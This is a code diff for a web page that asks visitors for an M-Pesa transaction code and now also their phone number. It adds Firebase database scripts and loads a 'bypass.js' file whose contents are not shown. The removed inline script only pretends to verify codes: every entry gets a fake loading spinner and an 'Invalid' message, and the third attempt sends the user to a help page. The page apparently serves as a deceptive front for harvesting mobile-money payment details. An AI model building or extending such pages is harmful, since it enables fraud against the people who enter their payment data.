@@ -16,6 +16,8 @@
     <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.19.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.19.1/firebase-database.js"></script>
     <!-- Custom CSS for styling -->
     <style>
     /*header{
@@ -34,23 +36,23 @@
         margin-left: 300px;
         margin-right: 0;
     }
-        body #main {
+       /* body #main {
             background-color: #C0FFF6; /* Softer green background */
-            color: black; /* White text color for better readability */
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* Modern font */
-            margin: 0;
+          /*  color: black; /* White text color for better readability */
+          /*  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* Modern font */
+          /*  margin: 0;
             padding: 0;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
-        }
+        }*/
         .container {
             text-align: center;
             max-width: 600px;
-            margin: auto;
-            padding: 20px;
+            /*margin: auto;*/
+            padding: 10px;
             /*background: #C1EEF1;*/
             border-radius: 10px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
@@ -198,7 +200,7 @@
     </style>
 </head>
 <header>
-    <button id="help">Help</button>
+  <button id="help">Help</button>
 </header>
 <body id="demo">
 <div id="main">
@@ -217,7 +219,10 @@
        </div>
         <div id="alert"></div>
         <p>ENTER MPESA CODE:</p>
-      <form id="form">  <input type="text" class="input-field" id="M" required placeholder="Enter Mpesa code here" /> </form>
+      <form id="form">
+      <input type="tel" class="input-field" name="phone" id="phone" required placeholder="Enter phone number used for payment" />  
+      <input type="text" class="input-field" id="M" required placeholder="Enter Mpesa code here" /> 
+      </form>
         <button class="button" id="bn">VERIFY MPESA CODE</button>
     </div>
 </div> 
@@ -244,83 +249,6 @@
         </div>
     </div>
 </div>
-    <script>
-    let form = document.getElementById("form");
-        let code = document.getElementById("M");
-        let button = document.getElementById("bn");
-        let counter = 0;
-        let loader = document.getElementById("Load");
-        let Alert = document.getElementById("alert");
-
-        button.onclick = function go() {
-            let Codes = code.value;
-            if (Codes) {
-                counter+=1;
-                if (counter<3){
-                    showLoader();
-                } else {
-                    Alert.textContent = 'We could not verify your mpesa code! Click on the help button for guidance.'
-                    Alert.style.display = 'block';
-                    form.reset();
-                }
-            } else {
-                codeAlert();
-            }
-            
-        }
-
-        function proceedToPayment() {
-                window.location.href = "guide.html";
-        }
-        function showLoader(){
-            loader.style.display = 'block';
-            setTimeout(()=>{loader.style.display = 'none';},3000);
-            setTimeout(()=>{
-                Alert.textContent = 'Invalid Mpesa code! Please try again';
-                Alert.style.display = 'block';
-                form.reset();
-                },3000);
-        setTimeout(()=>{
-                Alert.style.display = 'none';
-                },6000);  
-        }
-        
-        function codeAlert(){
-            Alert.textContent = 'Enter mpesa code!'
-                    Alert.style.display = 'block';
-            setTimeout(()=>{Alert.style.display = 'none';},3000);
-        }
-        document.getElementById('help').addEventListener('click',()=>{
-            document.getElementById('helpCenter').style.display = 'block';
-           document.getElementById('main').style.display = 'none';
-            
-        });
-      // const BT = document.getElementsByTagName('button');
-    //   console.log(BT);
-   // BT.addEventListener('click', ()=>{
-       // alert('clicked')});
-    const items = document.querySelectorAll('.butt'); 
-        items.forEach(item => {
-    item.addEventListener('click', function() {
-        // Get the name and details of the clicked item from the data attributes
-        const INFO = this.getAttribute('info');
-        
-        const btInfo = document.getElementById('info');
-        btInfo.style.display = 'block';
-        btInfo.textContent = INFO;
-        //console.log(btInfo.textContent);
-       // const itemDetails = this.getAttribute('data-details');
-        
-        // Display the name and details in the dedicated section
-    //document.getElementById('APPS').style.display = "none";
-        //detailsSection.style.display = 'block'; // Show the details section
-    });
-});
-
-
-
-
-
-    </script>
+    <script src="bypass.js"></script>
 </body>
 </html>
